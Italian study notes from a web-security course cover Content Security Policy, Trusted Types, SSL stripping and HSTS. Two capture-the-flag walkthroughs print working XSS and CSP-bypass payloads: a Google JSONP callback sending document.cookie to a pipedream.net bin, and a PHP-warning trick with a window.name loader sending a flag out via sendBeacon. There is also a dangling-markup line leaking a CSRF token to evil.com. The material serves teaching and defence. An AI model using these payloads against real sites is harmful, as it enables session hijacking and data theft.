>     
> - Mostra vettori che non richiedono interazione utente (es. `onactivate`).
>     
> - Dimostra la vastità della superficie di attacco XSS.

# Web Security: Content Security Policy (CSP)

**Tags:** #ingegneria #sicurezza_informatica #web_security #CSP #XSS #injection

## 1. Content Security Policy (CSP)

La **Content Security Policy (CSP)** è una politica progettata per controllare quali risorse possono essere caricate da una pagina web.

- Originariamente sviluppata per mitigare vulnerabilità di iniezione di contenuti come **XSS**.
    
- Attualmente utilizzata per molteplici scopi:
    
    - Restringere le capacità di framing.
        
    - Bloccare contenuti misti (mixed contents).
        
    - Restringere i target delle sottomissioni dei form.
        
    - Restringere gli URL verso cui il documento può iniziare navigazioni (via form, link, ecc.).
        

La politica viene comunicata tramite l'header HTTP `Content-Security-Policy`.

---

## 2. Direttive CSP

La CSP permette un filtraggio a grana fine delle risorse in base al loro tipo.

**Direttive principali:**

- `font-src`, `frame-src`, `img-src`, `media-src`, `script-src`, `style-src`, ecc.
    
- `default-src`: viene applicata quando manca una direttiva più specifica.
    

**Valori specificabili per ogni direttiva:**

- **Hosts** (con `*` come wildcard): es. `http://a.com`, `b.com`, `*.c.com`, `d.com:443`, `*`.
    
- **Schemes**: es. `http:`, `https:`, `data:`.
    
- **'self'**: mette in whitelist l'origine da cui la pagina è stata recuperata.
    
- **'none'**: non mette in whitelist alcun URL.
    

### Valori specifici per Script e Stylesheet

Le seguenti direttive sono specifiche per script e fogli di stile:

- **'unsafe-inline'**: mette in whitelist tutti gli stili/script inline (inclusi event handlers, JavaScript URIs, ...).
    
- **'unsafe-eval'**: permette l'uso di funzioni di valutazione dinamica del codice (es. `eval`).
    
- **'nonce-\<value>'**: mette in whitelist gli elementi che hanno il valore specificato nell'attributo `nonce`.
    
- **'sha256-\<value>'**, **'sha384-\<value>'**, **'sha512-\<value>'**: mette in whitelist gli elementi che hanno il valore di hash specificato (codificato in base64).
    
- **'unsafe-hashes'**: usato insieme a una direttiva hash per mettere in whitelist event handlers inline.
    
- **'strict-dynamic'**: permette l'esecuzione di script creati dinamicamente da altri script.
    

**Incompatibilità:**

- Quando vengono usati i **nonces**, `'unsafe-inline'` viene ignorato.
    
- Quando viene usato `'strict-dynamic'`, le whitelist e `'unsafe-inline'` vengono ignorati.
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```
default-src 'self';
style-src 'self' *.example.com;
script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='
'nonce-r4nd0mN0nc3' 'strict-dynamic'
```

> [!abstract] Code Analysis
> 
> - **default-src 'self'**: Risorse senza direttiva specifica (es. immagini) possono essere recuperate solo dalla stessa origine.
>     
> - **style-src**: Permessi fogli di stile dall'origine della pagina e dai sottodomini di `example.com`.
>     
> - **script-src**:
>     
>     - Script con attributo nonce `r4nd0mN0nc3` sono permessi.
>         
>     - Script creati dinamicamente da script permessi sono autorizzati (`strict-dynamic`).
>         
>     - Script con l'hash SHA256 specificato sono permessi.
>         

More examples: https://content-security-policy.com/
![[Pasted image 20260131142108.png]]

---

## 3. Bypassare la CSP con attacchi Code Reuse

Molti siti web utilizzano framework JavaScript molto popolari e complessi (es. AngularJS, React, Vue.js, Aurelia).

Questi framework contengono **script gadgets**: pezzi di JavaScript che reagiscono alla presenza di elementi DOM specificamente formati.

- **Idea:** Abusare degli script gadgets per ottenere l'esecuzione di codice iniettando elementi HTML dall'aspetto benigno.
    
- **Concetto:** È simile agli attacchi _code-reuse_ nei binari (come return-to-libc), ma applicato al Web.
    

#### Sezione Implementazione

Esempio di exploit per siti che usano il framework **Aurelia**:

**Here is the exact implementation shown in the slides:**

```HTML
<div ref="me" s.bind="$this.me.ownerDocument.defaultView.alert(1)" >
```

> [!abstract] Code Analysis
> 
> - `ref="me"`: Definisce un riferimento (chiamato "me") all'elemento div.
>     
> - `s.bind`: Contiene espressioni JS che vengono valutate da Aurelia. In questo caso, viene mostrato un popup di alert.
>     

---

## 4. Dangling Markup Injection

Anche senza iniettare script (es. bloccati da CSP o NoScript), un attaccante può causare danni seri iniettando elementi di markup HTML non script.

**Obiettivo:** Rubare dati sensibili, come token CSRF.

![[Pasted image 20260131142141.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** L'immagine mostra un tag `<img>` iniettato che non viene chiuso correttamente.
> 
> **Meaning:**
> 
> 1. L'attaccante inietta `<img src='http://evil.com/log.php?`.
>     
> 2. Nota l'uso del **singolo apice** che apre l'attributo `src`.
>     
> 3. La pagina contiene un input nascosto con un token CSRF: `<input type="hidden" name="csrf" value="2bnkDemF4">`.
>     
> 4. Poiché il tag immagine non è chiuso, il browser "mangia" tutto il contenuto successivo (incluso il token segreto) fino al prossimo singolo apice trovato nella pagina, inviandolo come parte dell'URL a `evil.com`.
>     

---

## 5. Training Challenge #10: CSP Bypass

- **URL:** `https://training10.webhack.it`
    
- **Descrizione:** "I heard CSP is all the rage now". La flag è nei cookie.
    
- **Scenario:** Applicazione che permette di creare post e segnalarli all'admin.
    

### Analisi della Policy

La pagina presenta una CSP molto stretta visualizzata direttamente nell'interfaccia.

**Here is the exact implementation shown in the slides:**
![[Pasted image 20260131142202.png]]
```
default-src 'self'; script-src 'self' *.google.com; connect-src *
```

> [!abstract] Code Analysis
> 
> - `default-src 'self'`: Blocca tutto per default eccetto l'origine stessa.
>     
> - `script-src 'self' *.google.com`: Permette script dall'origine stessa e da **qualsiasi sottodominio di google.com**.
>     
> - `connect-src *`: Permette connessioni (es. fetch/XHR) verso ovunque.
>     

### Il Problema (Vulnerabilità)

La CSP mette in whitelist `*.google.com`. Questo significa che possiamo eseguire codice proveniente da qualsiasi sottodominio di Google.

L'obiettivo è usare del codice standard presente su Google per rubare i cookie dell'admin.

---

## 6. Soluzione Challenge #10

### Fase 1: Identificare un Endpoint Vulnerabile (JSON-P)

![[Pasted image 20260131142218.png]]
![[Pasted image 20260131142330.png]]![[Pasted image 20260131142341.png]]![[Pasted image 20260131142346.png]]![[Pasted image 20260131142352.png]]![[Pasted image 20260131142356.png]]

Esiste un endpoint JSON-P ben noto su `google.com` che può essere abusato.

L'endpoint è: `https://accounts.google.com/o/oauth2/revoke`

Se proviamo a visitarlo passando un codice JS nel parametro `callback`, Google restituisce quel codice (con alcune restrizioni).

**Esempio di Payload URL-encoded:**

`https://accounts.google.com/o/oauth2/revoke?callback=window.location.href%3D%27https%3A%2F%2Feny8f5vjfnae.x.pipedream.net%3Fa%3D%27%2Bdocument.cookie%3B%22`

**Risposta generata da Google:**

**Here is the exact implementation shown in the slides:**

JavaScript

```
// API callback
window.location.href='https://eny8f5vjfnae.x.pipedream.net?a='+document.cookie; "({
 "error": {
 "code": 400,
 "message": "Invalid JSONP callback name ... status": "INVALID ARGUMENT"
 }
);
```

> [!abstract] Code Analysis
> 
> Google riflette il contenuto del parametro `callback` all'inizio della risposta. Poiché `accounts.google.com` è in whitelist CSP, questo script verrà eseguito dal browser.

### Fase 2: Creare il Post Malevolo

Creiamo un post nell'applicazione vulnerabile che include uno script con `src` che punta all'endpoint di Google.

**Here is the exact implementation shown in the slides:**

HTML

```
<script
src="https://accounts.google.com/o/oauth2/revoke?callback=window.location.href%3D%27https%3A%2F%2Fenh4dufno2pxw.x.pipedream.net%3Fa%3D%27%2Bdocument.cookie%3B"></script>
```

Visitando questo post, veniamo reindirizzati a `requestbin.com` (o servizio simile come Pipedream) con i cookie appesi.

### Fase 3: Attacco all'Admin

Dobbiamo segnalare il post all'admin. Usiamo lo stesso approccio delle challenge XSS precedenti:

1. Creare un post benigno.
    
2. Intercettare la richiesta di "Report to admin".
    
3. Alterare la richiesta sostituendo l'ID del post benigno con l'ID del post malevolo contenente lo script.
    

**Richiesta Intercettata (Burp Suite):**

HTTP

```
GET /report?id=3 HTTP/2
Host: training10.webhack.it
Cookie: challenge_auth_token=...
```

### Risultato

L'admin visita il post, lo script viene caricato da `accounts.google.com` (permesso dalla CSP), esegue il redirect e invia i cookie al server dell'attaccante.

Su RequestBin apparirà una richiesta GET con il parametro `a` contenente il cookie `flag=WIT{...}`.

# Web Security: Training Challenge #14

**Tags:** #ingegneria #sicurezza_informatica #web_security #CTF #CSP #PHP #XSS #header_injection

## 1. Descrizione della Challenge

La **Challenge #14** introduce un programma di _bug bounty_.

- **URL:** `https://training14.webhack.it`
    
- **Obiettivo:** Trovare vulnerabilità nel sistema di bug bounty appena avviato.
    

![[Pasted image 20260131142425.png]]

---

## 2. Analisi del Codice Sorgente

Il cuore della sicurezza dell'applicazione risiede nel file `index.php`. Le slide mostrano il codice PHP che gestisce la sicurezza e la visualizzazione della pagina.

### Generazione del Nonce e CSP

Il sistema implementa una **Content Security Policy (CSP)** dinamica basata su un _nonce_.

**Here is the exact implementation shown in the slides:**

```PHP
require_once("secrets.php");
$nonce = random_bytes(16);

// ... (logica admin) ...

for ($i=0; $i<10; $i++){
    if(isset($_GET['alg']))
        $nonce = hash($_GET['alg'], $nonce);
    else
        $nonce = md5($nonce);
}
```

> [!abstract] Code Analysis
> 
> - **Random Seed:** Il `$nonce` iniziale è generato in modo casuale (`random_bytes`).
>     
> - **Hashing:** Il nonce viene elaborato 10 volte.
>     
> - **Algoritmo Variabile:** L'algoritmo di hashing è selezionabile dall'utente tramite il parametro GET `alg`. Di default è `md5`.
>     

### Impostazione degli Header e Output

L'applicazione imposta l'header CSP e mostra l'input utente, ma con vincoli specifici.

**Here is the exact implementation shown in the slides:**

```PHP
if(isset($_GET['user']) && strlen($_GET['user']) <= 23) {
    header("content-security-policy: default-src 'none'; style-src 'nonce-$nonce'; script-src 'nonce-$nonce'");
    echo "
    <script nonce='$nonce'>
    setInterval
    ( user.style.color=Math.random()<0.5?'red':'black'
    ,100);
    </script>
    <center><h1>Hello <span id=user>" . $_GET['user'] . "</span></h1>";
}
```

> [!abstract] Code Analysis
> 
> - **CSP Strict:** `default-src 'none'`. Script e stili sono permessi solo se hanno il nonce corretto.
>     
> - **Injection Point:** L'input `$_GET['user']` viene stampato nella pagina.
>     
> - **Vincolo di Lunghezza:** La lunghezza dell'input utente deve essere **minore o uguale a 23 caratteri**.
>     

---

## 3. Identificazione delle Vulnerabilità

L'analisi evidenzia due punti deboli potenziali che, combinati, portano alla compromissione del sistema.

### Problema 1: Gestione degli Header PHP

La funzione `header()` in PHP ha un comportamento critico: deve essere chiamata **prima** che qualsiasi output venga inviato al client.

- Se viene generato dell'output (HTML, spazi bianchi, o **messaggi di errore**) prima della chiamata a `header()`, l'invio degli header fallisce.
    
- **Opportunità:** Se riusciamo a far generare un errore o un warning a PHP _prima_ che venga impostata la CSP, l'header `Content-Security-Policy` **non verrà inviato**, rendendo la protezione inefficace.
    

### Problema 2: Injection Limitata

Anche disabilitando la CSP, rimane il vincolo di lunghezza:

- Possiamo iniettare codice HTML/JS tramite il parametro `user`.
    
- Lo spazio disponibile è di soli **23 caratteri**.
    
- Payload XSS classici (es. `<script>alert(1)</script>`) sono troppo lunghi.
    

---

## 4. Soluzione: Bypass della CSP

Per disabilitare la CSP, dobbiamo forzare PHP a generare output prima della chiamata `header()`.

### Tecnica: Error Generation

Le slide suggeriscono di generare dei **Warning** manipolando il parametro `alg` usato nella funzione `hash()`.

1. **Algoritmo Invalido:** Passare un nome di algoritmo inesistente (es. `alg=a`).
    
2. **Buffer Flushing:** Per assicurarsi che l'errore venga mostrato e "flushato" al client (riempiendo il buffer di output), si può passare una stringa molto lunga per `alg`.
    

**Risultato atteso:**

![[Pasted image 20260131142618.png]]

```
Warning: hash(): Unknown hashing algorithm: a in /var/www/html/index.php on line 21
...
```

> [!abstract] Visual Analysis
> 
> **What to look at:** I messaggi di warning PHP visualizzati nella pagina prima del codice HTML.
> 
> **Meaning:** La presenza di questi warning impedisce l'invio degli header HTTP successivi, inclusa la CSP. Il browser riceve la pagina senza restrizioni di sicurezza.

---

## 5. Soluzione: XSS in 23 Caratteri

Con la CSP disabilitata, dobbiamo iniettare un payload XSS valido in massimo 23 caratteri.

### Il Payload: `window.name`

Esiste un vettore XSS estremamente compatto che sfrutta la proprietà persistente `window.name`.

**Here is the exact implementation shown in the slides:**

```HTML
<svg onload=eval(name)
```

> [!abstract] Code Analysis
> 
> - **Lunghezza:** Questo payload è molto breve (circa 22 caratteri, rientra nel limite di 23).
>     
> - **Funzionamento:**
>     
>     1. `<svg onload=...>`: Esegue JavaScript al caricamento dell'elemento SVG.
>         
>     2. `eval(name)`: Esegue il codice contenuto nella proprietà `window.name`.
>         
>     3. `window.name`: È una proprietà che persiste attraverso i reindirizzamenti e può essere impostata dalla pagina che apre il link (la pagina dell'attaccante).
>         

---

## 6. Exploitation Completa

L'attacco finale richiede di concatenare il bypass della CSP con il payload XSS, utilizzando una pagina controllata dall'attaccante per preparare il contesto di esecuzione (`window.name`).

### Setup dell'Attaccante

Bisogna creare una pagina malevola che l'admin (o il bot del bug bounty) visiterà. Questa pagina deve:

1. Impostare `window.name` con il codice JavaScript malevolo completo (che non entrava nei 23 caratteri).
    
2. Reindirizzare la vittima verso l'URL vulnerabile della challenge.
    

**Here is the exact implementation shown in the slides:**

```HTML
<script>
name="fetch('?flag').then(e=>e.text()).then(e=>navigator.sendBeacon('OUR-URL-SUPPORTING-POST-REQUEST', 'flag='+e))";

location="https://training14.webhack.it/?user=%3Csvg%20onload=eval(name)%3E&alg=LONG-STRING";
</script>
```

> [!abstract] Code Analysis
> 
> - **`name=...`**: Qui inseriamo il payload lungo. Usa `fetch('?flag')` per prendere il flag e `navigator.sendBeacon` per inviarlo al server dell'attaccante.
>     
> - **`location=...`**: Reindirizza alla challenge.
>     
>     - `user=%3Csvg%20onload=eval(name)%3E`: Inietta il payload corto `<svg onload=eval(name)>`.
>         
>     - `alg=LONG-STRING`: Inietta una stringa lunga e invalida per scatenare i warning PHP e disabilitare la CSP.
>         

### Recupero del Flag

1. L'attaccante ospita la pagina sopra (es. usando Python + Ngrok).
    
2. Invia l'URL della pagina malevola tramite la funzionalità "Bug Bounty" del sito.
    
3. L'admin visita il link.
    
4. Il browser dell'admin esegue il codice in `window.name`, preleva il flag e lo invia al server di log dell'attaccante (es. RequestBin o Pipedream).
    
5. Il flag appare nei log (es. `Flag=WIT{...}`).
![[Pasted image 20260131142656.png]]

# Web Security: Trusted Types & Network Protocol Issues

**Tags:** #ingegneria #sicurezza_informatica #web_security #trusted_types #XSS #HSTS #SSL_stripping

## 1. Trusted Types

Le **Trusted Types** rappresentano una nuova API (spinta da Google) progettata per eliminare radicalmente i DOM-based XSS.

### Concetto Fondamentale

L'idea alla base è **bloccare** (lock down) i "dangerous injection sinks" (punti di iniezione pericolosi) in modo che non possano più essere chiamati utilizzando semplici stringhe.

- **Interazione Limitata:** L'interazione con queste funzioni è permessa _solo_ tramite speciali oggetti tipizzati (**trusted typed objects**).
    
- **Creazione Oggetti:** Questi oggetti possono essere creati solo all'interno di una **Trusted Type Policy** (codice JavaScript che fa parte dell'applicazione web).
    
- **Enforcement:** Le policy vengono imposte impostando il valore speciale `trusted-types` nell'header CSP (Content Security Policy).
    

**Obiettivo:** In un'applicazione che applica rigorosamente i Trusted Types (TT-enforced), il codice è "sicuro per default" e l'unica parte che potrebbe introdurre vulnerabilità DOM XSS risiede nella definizione delle policy stesse.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```JavaScript
const templateId = location.hash.match(/tplid=([^;]*)/)[1];
// typeof templateId == "string"

document.head.innerHTML += templateId // Throws a TypeError!
```

> [!abstract] Code Analysis
> 
> Il tentativo di assegnare una stringa (`templateId`) direttamente a `innerHTML` (un sink pericoloso) causa un `TypeError` perché non è un oggetto Trusted Type.

---

## 2. Implementazione di Trusted Types

Per correggere il codice e renderlo conforme, è necessario creare una policy che gestisca la creazione dell'HTML fidato.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```JavaScript
const templatePolicy = TrustedTypes.createPolicy('template', {
 createHTML: (templateId) => {
  const tpl = templateId;
  if (/^[0-9a-z-]$/.test(tpl)) {
   return `<link rel="stylesheet" href="./templates/${tpl}/style.css">`;
  }
  throw new TypeError();
 }
});

const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;]*)/)[1]);

// html instanceof TrustedHTML

document.head.innerHTML += html;
```

> [!abstract] Code Analysis
> 
> 1. **`createPolicy`**: Definisce una policy chiamata 'template'.
>     
> 2. **`createHTML`**: Funzione di sanitizzazione/validazione. Verifica che l'input contenga solo caratteri alfanumerici e trattini.
>     
> 3. **Utilizzo**: Si chiama `templatePolicy.createHTML(...)` per ottenere un oggetto `html` che è un'istanza di `TrustedHTML`.
>     
> 4. **Assegnazione**: Ora l'assegnazione a `document.head.innerHTML` è permessa.
>     

### Classificazione dei Trusted Types

Sono stati identificati oltre 60 "injection sinks" differenti. Esistono 3 possibili tipi di oggetti fidati:

1. **TrustedHTML:** Stringhe che possono essere inserite con sicurezza nei sink e renderizzate come HTML.
    
2. **TrustedScript:** Da usare nei sink che potrebbero eseguire codice.
    
3. **TrustedScriptURL:** Da usare nei sink che parificano l'input come URL di una risorsa script esterna.
    

### Possibili Insidie (Pitfalls)

- Gli XSS **non** DOM-based potrebbero comunque portare a un bypass delle restrizioni della policy.
    
- La **sanitizzazione** è lasciata come esercizio a chi scrive la policy (se la logica di validazione è errata, la sicurezza cade).
    
- Le policy sono codice JavaScript custom che potrebbe dipendere dallo stato globale dell'applicazione.
    

---

## 3. Network Protocol Issues: SSL Stripping

Questa sezione analizza i rischi nel passaggio da HTTP a HTTPS.

### Scenario di Attacco

Quando un utente digita un URL (es. `www.bank.com`) nella barra degli indirizzi, i browser spesso usano **HTTP** come protocollo predefinito, a meno che non sia specificato diversamente.

Il server risponde solitamente con un redirect:

```HTTP
301 Permanent Redirect
Location: https://www.bank.com
```

In questo intervallo, un attaccante può eseguire un attacco di **SSL Stripping**.

![[Pasted image 20260131142758.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo schema mostra l'attaccante posizionato tra la Vittima e il server `bank.com`.
> 
> **Meaning:**
> 
> 1. **Vittima -> Attaccante:** Invia richiesta HTTP (`GET http://...`).
>     
> 2. **Attaccante -> Server:** Invia richiesta HTTPS (`GET https://...`).
>     
> 3. **Server -> Attaccante:** Risponde con contenuto sicuro.
>     
> 4. **Attaccante -> Vittima:** Inoltra il contenuto ma **downgrada** il protocollo a HTTP, riscrivendo i link e i form (`<FORM action="http://...">`).
>     
> 5. La vittima crede di comunicare con la banca, ma i dati viaggiano in chiaro verso l'attaccante.
>     

---

## 4. HTTP Strict Transport Security (HSTS)

HSTS è una contromisura che permette a un server di dichiarare che tutte le interazioni future devono avvenire **esclusivamente** su HTTPS.

### Funzionamento

- Viene distribuito tramite l'header HTTP: `Strict-Transport-Security`.
    
- **Upgrade Automatico:** Il browser converte automaticamente tutte le richieste HTTP in HTTPS per quel dominio.
    
- **Gestione Errori:** Se si verificano errori durante il setup della connessione sicura (es. certificato invalido), la connessione viene chiusa (senza dare all'utente la possibilità di procedere comunque).
    
- **Vincolo:** L'header viene ignorato se ricevuto tramite una connessione HTTP (non sicura).
    

### Problema "First Time" e Preloading

Gli attaccanti possono ancora eseguire SSL stripping la **prima volta** che un sito viene visitato (prima che il browser riceva l'header HSTS).

- **Soluzione:** I browser includono una **preload list** di siti web noti per supportare HTTPS.
    
- Requisiti per l'inclusione: `https://hstspreload.org`
    

### Policy HSTS

Una policy HSTS è definita dai seguenti parametri nell'header:

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

HTTP

```
max-age=6307200; includeSubDomains; preload
```

> [!abstract] Code Analysis
> 
> - **`max-age`**: Durata della policy in secondi (es. 6307200).
>     
> - **`includeSubDomains`**: (Opzionale) La policy si applica anche ai sottodomini.
>     
> - **`preload`**: (Opzionale) Richiede l'inserimento del sito nella lista di preload del browser.
>     

---

## 5. Bypassare HSTS con NTP

È possibile aggirare la protezione HSTS manipolando l'orologio di sistema tramite il protocollo NTP (Network Time Protocol).

- **NTP:** Usato per sincronizzare l'orologio tra macchine. Spesso non usa autenticazione.
    
- **Vulnerabilità:** Molti sistemi operativi accettano qualsiasi orario contenuto nella risposta NTP.
    
    - _Eccezioni:_ Alcuni OS impongono vincoli sulla differenza di tempo (es. Windows max 15-48 ore, macOS solo una volta).
        
- **L'Attacco:** L'attaccante intercetta il traffico NTP e invia risposte con un orario spostato molto avanti nel **futuro**.
    
- **Risultato:** Le policy HSTS memorizzate dal browser (che hanno un `max-age`) risultano **scadute**. Il browser torna ad accettare connessioni HTTP vulnerabili.